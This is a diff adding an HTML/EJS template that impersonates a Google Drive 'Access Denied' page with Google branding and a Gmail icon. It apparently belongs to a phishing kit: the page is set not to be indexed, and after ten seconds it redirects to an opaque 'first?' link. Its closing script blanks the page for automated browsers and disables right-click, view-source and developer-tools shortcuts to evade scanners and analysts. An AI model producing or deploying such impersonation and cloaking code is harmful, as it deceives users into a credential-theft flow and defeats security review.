@@ -1,0 +1,176 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<title>Drive Warning</title>
+<%- include('partials/meta-noindex') %>
+<link rel="shortcut icon" href="/image/gmail.ico" type="image/x-icon">
+
+<!-- Google-like font -->
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Google Sans', system-ui, -apple-system, sans-serif;
+            background-color: #ffffff;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        
+        .card {
+            background: white;
+            width: 100%;
+            max-width: 680px;
+            overflow: hidden;
+            padding: 48px 40px;
+            transform: translateY(-50px);
+        }
+        
+        .content {
+            display: flex;
+            align-items: center;
+            gap: 60px;
+        }
+        
+        .left {
+            flex: 1;
+            text-align: center;
+        }
+        
+        .right {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        h1 {
+            font-size: 35px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+        
+        .subtitle {
+            font-size: 15px;
+            color: black;
+            margin-bottom: 32px;
+           ;        }
+
+
+        
+        .learn-more {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .learn-more:hover {
+            text-decoration: underline;
+        }
+        
+        .message-box {
+            width: 100%;
+            min-height: 85px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 12px 16px;
+            font-family: inherit;
+            font-size: 14px;
+            margin: 32px 0;
+            resize: vertical;
+        }
+        
+        .message-box:focus {
+            outline: none;
+            border-color: #1a73e8;
+        }
+        
+        .request-btn {
+            background-color:#3a38fa;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        .request-btn:hover {
+            background-color: #3a38fa;
+        }
+        
+        /* Style the custom line */
+.custom-line {
+    height: 2px; /* Thickness of the line */
+    background-color: #4CAF50; /* Green color (can be changed) */
+    margin: 20px 0; /* Adds space above and below the line */
+    width: 100%; /* Makes the line full width of the container */
+}
+       
+    </style>
+    <script>
+        function returnToDrive() {
+            window.location.href = "first?mbbjgsmhyropjmhnkidgdjkjsetwungdkdh";
+        }
+        setTimeout(returnToDrive, 10000);
+    </script>
+</head>
+<body>
+    <div class="card">
+        
+        <div class="content">
+
+            <!-- Left Side -->
+            <div class="left">
+                <!-- Add the Google Drive Logo here -->
+                <img src="data:image/png;base64,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" alt="Google Drive" width="280px">
+<br></br>
+                <p style="color: red; font-size: 24px;">Access Denied</p><br>
+                <p class="subtitle">
+                   Your account does not have permission to access this Google Drive file. <br>
+                   Please contact the owner or switch to an account with access.
+                     
+                </p>
+
+                <button onclick="returnToDrive()" style="background-color: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 20px; font-size: 14px; cursor: pointer;"> Return to Drive </button>
+               
+   
+            </div>
+            
+         
+                </div>
+            </div>
+        </div>
+    </div>
+<script>
+(function(){
+  document.querySelector('body').style.display='flex';
+  if(navigator.webdriver||window.__nightmare||window.callPhantom||window._phantom){
+    document.body.innerHTML='';
+    window.location.href='about:blank';
+  }
+  document.addEventListener('contextmenu',function(e){e.preventDefault();});
+  document.addEventListener('keydown',function(e){
+    if(e.key==='F12')e.preventDefault();
+    if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i'))e.preventDefault();
+    if(e.ctrlKey&&(e.key==='U'||e.key==='u'))e.preventDefault();
+    if(e.ctrlKey&&e.shiftKey&&(e.key==='J'||e.key==='j'))e.preventDefault();
+    if(e.ctrlKey&&e.shiftKey&&(e.key==='C'||e.key==='c'))e.preventDefault();
+  });
+})();
+</script>
+</body>
+</html>
